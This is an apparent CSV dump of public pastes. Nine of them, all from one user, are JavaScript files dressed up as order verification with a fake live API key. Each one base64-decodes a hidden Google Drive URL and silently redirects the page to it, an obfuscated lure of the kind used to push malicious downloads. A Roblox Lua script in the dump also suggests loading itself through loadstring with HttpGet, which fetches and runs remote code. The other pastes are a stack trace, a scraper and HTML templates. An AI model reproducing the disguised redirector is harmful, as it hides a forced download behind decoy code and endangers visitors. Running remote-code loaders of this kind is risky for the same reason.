id,title,username,language,date,content
G7GLThSA,2025-04-18T07:13:24.061371,powerampache,PHP,Thursday 17th of April 2025 11:13:24 PM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:958)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:224)
	at android.os.Looper.loop(Looper.java:318)
	at android.app.ActivityThread.main(ActivityThread.java:8790)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:561)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1013)

getSongsFromAlbum() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
fH2dzeWM,Untitled,SpawnKz,JavaScript,Thursday 17th of April 2025 11:06:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49638/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M7AhCHQN,Products.js,SpawnKz,JavaScript,Thursday 17th of April 2025 10:51:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44672/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EGQmf8Qp,Order.js,SpawnKz,JavaScript,Thursday 17th of April 2025 10:35:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38613/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VyD6syKx,Market.js,SpawnKz,JavaScript,Thursday 17th of April 2025 10:20:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87134/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
epAejNqP,Untitled,SpawnKz,JavaScript,Thursday 17th of April 2025 10:04:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17313/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Dn7CdvgV,Products.js,SpawnKz,JavaScript,Thursday 17th of April 2025 09:49:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68553/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tuWykU8j,Extract level data from Arcane,Some_Aspy,JavaScript,Thursday 17th of April 2025 09:40:01 PM CDT,"/**
 * Parses numeric strings that might contain 'K' (thousands) or 'M' (millions).
 * Example: ""232.7K"" => 232700, ""1.5M"" => 1500000, ""500"" => 500
 * @param {string} valueStr The string value to parse.
 * @returns {number} The parsed numeric value. Returns 0 if parsing fails or input is '-'.
 */
function parseNumericValue(valueStr) {
    if (!valueStr || typeof valueStr !== 'string') {
        return 0;
    }
    const cleanedStr = valueStr.trim().toUpperCase();
    // Handle cases like '-' which mean zero/not applicable
    if (cleanedStr === '-') {
        return 0;
    }

    let multiplier = 1;
    let numPart = cleanedStr;

    if (cleanedStr.endsWith('K')) {
        multiplier = 1000;
        numPart = cleanedStr.slice(0, -1);
    } else if (cleanedStr.endsWith('M')) {
        multiplier = 1000000;
        numPart = cleanedStr.slice(0, -1);
    }

    const num = parseFloat(numPart);
    if (isNaN(num)) {
        return 0; // Return 0 if it's not a valid number after processing
    }

    return Math.round(num * multiplier); // Use Math.round for cases like 232.7K
}


/**
 * Parses the HTML structure containing user level data and transforms it
 * into the specified JSON format.
 * Assumes the HTML is present in the current document.
 */
function extractLevelData() {
    // Find all the user data boxes
    const userBoxes = document.querySelectorAll('.box.box-hover');

    const levels = [];

    userBoxes.forEach(box => {
        try {
            // --- Extract Avatar and User ID ---
            const imgElement = box.querySelector('figure.image img');
            let avatar = null;
            let userId = null;
            if (imgElement && imgElement.src) {
                const src = imgElement.src;
                const avatarMatch = src.match(/avatars\/(\d+)\/([a-f0-9_]+)\.png/);
                if (avatarMatch) {
                    userId = avatarMatch[1];
                    avatar = avatarMatch[2];
                } else {
                    // Try extracting userId from onerror attribute if it's a default avatar
                    const onerrorAttr = imgElement.getAttribute('onerror');
                    if (onerrorAttr) {
                        // Attempt to find a user ID within the onerror string
                        // This is less reliable and depends on the exact string format
                        const userIdMatch = onerrorAttr.match(/avatars\/(\d+)/); // Simpler regex attempt
                        if (userIdMatch && userIdMatch[1]) {
                            // Check if it's just a placeholder like '1' vs a real ID
                            if (userIdMatch[1].length > 5) { // Assume real IDs are longer
                                userId = userIdMatch[1];
                            }
                        }
                    }
                    avatar = null; // Default avatar
                }
            }

            // --- Extract Tag (Username) ---
            const tagElement = box.querySelector('p.has-text-white.is-size-5.has-text-weight-semibold:not([style*=""min-width""])');
            let tag = null;
            if (tagElement && tagElement.textContent.startsWith('@')) {
                tag = tagElement.textContent.substring(1);
            }

            // --- Extract Stats (Level, XP, MessageCount) by Order ---
            // Select all potential stat <p> elements within the flex container THAT HAVE a min-width style
            const statsElements = box.querySelectorAll('div[style*=""display: flex""] > p.has-text-white.is-size-5.has-text-weight-semibold[style*=""min-width""]');

            let level = 0;
            let xp = 0;
            let messageCount = 0;

            // Assign based on index position:
            // Index 0: Level
            if (statsElements.length > 0) {
                level = parseInt(statsElements[0].textContent.trim(), 10) || 0; // Level is usually an integer
            }
            // Index 1: XP
            if (statsElements.length > 1) {
                xp = parseNumericValue(statsElements[1].textContent.trim());
            }
            // Index 2: Message Count
            if (statsElements.length > 2) {
                messageCount = parseNumericValue(statsElements[2].textContent.trim());
            }

            // --- Construct Level Object ---
            // Only add if we successfully found a userId and tag
            if (userId && tag) {
                levels.push({
                    avatar: avatar,
                    level: level,
                    messageCount: messageCount, // Correctly assigned separate value
                    tag: tag,
                    userId: userId,
                    xp: xp // Correctly assigned separate value
                });
            } else {
                // Attempt to find userId from tag if missing from image (less common)
                // Requires a mapping or external lookup usually, cannot be done from HTML alone reliably.
                // Log a warning if critical info is missing.
                if (!userId) console.warn(""Missing userId for tag:"", tag, box);
                if (!tag) console.warn(""Missing tag for box:"", box);
                // console.warn(""Could not extract required data (userId or tag) for box:"", box);
            }

        } catch (error) {
            console.error(""Error processing user box:"", error, box);
        }
    });

    // --- Construct Final Export Object ---
    const exportData = {
        levels: levels
    };

    // --- Output JSON ---
    console.log(JSON.stringify(exportData, null, 2)); // Pretty print JSON
    return exportData; // Return the data structure
}

// --- Run the function ---
// Make sure the HTML content is loaded in the document before calling this.
// You would typically run this in the browser's developer console
// on the page displaying the leaderboard HTML.
extractLevelData();"
eC7iz9Mi,Order.js,SpawnKz,JavaScript,Thursday 17th of April 2025 09:34:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44229/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
usqkbRJX,Market.js,SpawnKz,JavaScript,Thursday 17th of April 2025 09:18:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19504/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hR2R1hu1,3D Gui toggled,Mautiku,Lua,Thursday 17th of April 2025 09:15:26 PM CDT,"--========3D guis toggled========
-- Type ""/e rg"" to remove the toggled gui
-- rg means Remove gui btw
-- The ""/e d<nunber>""  its kinda buggy i'll try to fix it if i got time
-- d<number> means drag with numbers example like d10 it would give you 10 seconds to lets you drag
-- SussyXDDDDdDDdDDDD
--[[ YOU CAN USE THIS LOADSTRING TOO RIGHT HERE

_G.ToggleKeybind = Enum.KeyCode.F
loadstring(game:HttpGet(""https://pastebin.com/raw/hR2R1hu1""))()

— So that was a loadstring if you want to change the key i bet you already know how to do that 

YT:
░██████╗██╗░░░██╗░██████╗░██████╗██╗░░░██╗
██╔════╝██║░░░██║██╔════╝██╔════╝╚██╗░██╔╝
╚█████╗░██║░░░██║╚█████╗░╚█████╗░░╚████╔╝░
░╚═══██╗██║░░░██║░╚═══██╗░╚═══██╗░░╚██╔╝░░
██████╔╝╚██████╔╝██████╔╝██████╔╝░░░██║░░░
╚═════╝░░╚═════╝░╚═════╝░╚═════╝░░░░╚═╝░░░
██╗░░██╗██████╗░██████╗░
╚██╗██╔╝██╔══██╗██╔══██╗
░╚███╔╝░██║░░██║██║░░██║
░██╔██╗░██║░░██║██║░░██║
██╔╝╚██╗██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░

]]

local player = game.Players.LocalPlayer
local userInput = game:GetService(""UserInputService"")
local runService = game:GetService(""RunService"")
local tweenService = game:GetService(""TweenService"")

--======= CHANGE YOUr KEYBIND HERE =======--
local toggleKey = _G.ToggleKeybind or Enum.KeyCode.F

local function createGui()
	local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
	gui.Name = ""FloatingGuiToggle""
	gui.ResetOnSpawn = false

	local toggleButton = Instance.new(""TextButton"")
	toggleButton.Size = UDim2.new(0, 120, 0, 40)
	toggleButton.Position = UDim2.new(1, -130, 0, 20)
	toggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	toggleButton.Text = ""Hide 3D GUI""
	toggleButton.Font = Enum.Font.GothamBold
	toggleButton.TextScaled = true
	toggleButton.BackgroundTransparency = 0
	toggleButton.TextTransparency = 0
	toggleButton.Parent = gui
	Instance.new(""UICorner"", toggleButton).CornerRadius = UDim.new(0, 12)

	local isVisible = true
	local dragging = false
	local holding = false
	local dragOffset = Vector2.new()
	local startTime = 0
	local countdownTime = 0
	local countdownRunning = false

	local function toggle3DGui()
		isVisible = not isVisible
		toggleButton.Text = isVisible and ""Hide 3D GUI"" or ""Show 3D GUI""

		for _, part in ipairs(workspace:GetChildren()) do
			if part:IsA(""Part"") and part:FindFirstChildWhichIsA(""SurfaceGui"") then
				part.Transparency = isVisible and 0.8 or 1
				part.CanCollide = isVisible
				for _, sg in ipairs(part:GetChildren()) do
					if sg:IsA(""SurfaceGui"") then
						sg.Enabled = isVisible
					end
				end
			end
		end
	end

	toggleButton.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			startTime = tick()
			holding = true
			dragOffset = input.Position - toggleButton.AbsolutePosition

			local conn
			conn = runService.RenderStepped:Connect(function()
				if not holding then conn:Disconnect() return end
				if tick() - startTime >= 0.3 and not dragging then
					dragging = true
					toggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 255)
				end
			end)
		end
	end)

	userInput.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local pos = input.Position - dragOffset
			toggleButton.Position = UDim2.new(0, pos.X, 0, pos.Y)
		end
	end)

	toggleButton.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			if dragging then
				dragging = false
				toggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			elseif tick() - startTime < 0.3 then
				toggle3DGui()
			end
			holding = false
		end
	end)

	userInput.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end
		if input.KeyCode == toggleKey then
			toggle3DGui()
		end
	end)

	player.Chatted:Connect(function(msg)
		if msg:lower() == ""/e rg"" and gui and gui.Parent then
			toggleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
			toggleButton.TextColor3 = Color3.fromRGB(0, 0, 0)
			toggleButton.Text = ""2""

			for i = 2, 1, -1 do
				toggleButton.Text = tostring(i)
				wait(1)
			end

			local tween = tweenService:Create(toggleButton, TweenInfo.new(0.6), {
				BackgroundTransparency = 1,
				TextTransparency = 1
			})
			tween:Play()
			tween.Completed:Wait()
			gui:Destroy()
		end
	end)

	player.Chatted:Connect(function(msg)
		if msg:lower():match(""^/e d(%d+)$"") then
			local num = tonumber(msg:match(""^/e d(%d+)$""))
			if num then
				toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
				toggleButton.Text = tostring(num)

				countdownTime = num
				countdownRunning = true
				dragging = true

				for i = countdownTime, 1, -1 do
					if not countdownRunning then break end
					toggleButton.Text = tostring(i)
					wait(1)
				end

				countdownRunning = false
				dragging = false
				toggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
				toggleButton.Text = ""Hide 3D GUI""
			end
		end
	end)
end

createGui()
task.wait(1)
player:Chat(""/e reload"")
player:Chat(""/e reload"")

player.Chatted:Connect(function(msg)
	if msg:lower() == ""/e reg"" then
		if not player:FindFirstChild(""PlayerGui""):FindFirstChild(""FloatingGuiToggle"") then
			local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
			gui.Name = ""FloatingGuiToggle""
			gui.ResetOnSpawn = false

			local btn = Instance.new(""TextButton"")
			btn.Size = UDim2.new(0, 120, 0, 40)
			btn.Position = UDim2.new(1, -130, 0, 20)
			btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
			btn.Text = ""...""
			btn.Font = Enum.Font.GothamBold
			btn.TextScaled = true
			btn.BackgroundTransparency = 1
			btn.TextTransparency = 1
			btn.Parent = gui
			Instance.new(""UICorner"", btn).CornerRadius = UDim.new(0, 12)

			local tween = tweenService:Create(btn, TweenInfo.new(0.6), {
				BackgroundTransparency = 0,
				TextTransparency = 0,
			})
			tween:Play()
			tween.Completed:Wait()

			btn:Destroy()
			createGui()
		end
	end
end)"
YqHbeLBa,revamped christmas,elltaker,HTML,Thursday 17th of April 2025 09:11:02 PM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mx7ganqHpQ1qk1or3.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/tumblr_inline_mx7ganqHpQ1qk1or3.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mx7g6kG3ti1qk1or3.gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mx7g7jbmm51qk1or3.gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/tumblr_inline_mxht9bZWwG1qid2nw.gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://graphic.neocities.org/tumblr_inline_nfys62j7uH1rpglid.gif"" style=""height:35px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/tumblr_static_7vxrzps658o4ks0kogc8k0044.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
13ZgYYS8,revamped fish,elltaker,HTML,Thursday 17th of April 2025 09:06:01 PM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/Unter_Wasser_63.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/Unter_Wasser_63.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/%E5%8B%95%E7%89%A9-%E3%82%A2%E3%83%8B%E3%83%9E%E3%83%AB_m%20(7).gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/%E5%8B%95%E7%89%A9-%E3%82%A2%E3%83%8B%E3%83%9E%E3%83%AB_m%20(7).gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/%E5%8B%95%E7%89%A9-%E3%82%A2%E3%83%8B%E3%83%9E%E3%83%AB_m%20(7).gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://graphic.neocities.org/tumblr_li1zutzibB1qf91leo1_500.gif"" style=""height:40px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/fbr.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
jSixqFcc,Untitled,SpawnKz,JavaScript,Thursday 17th of April 2025 09:03:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64435/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pRhJYBqq,revamped frog,elltaker,HTML,Thursday 17th of April 2025 09:01:38 PM CDT,https://graphic.neocities.org/Frosch_17.gif
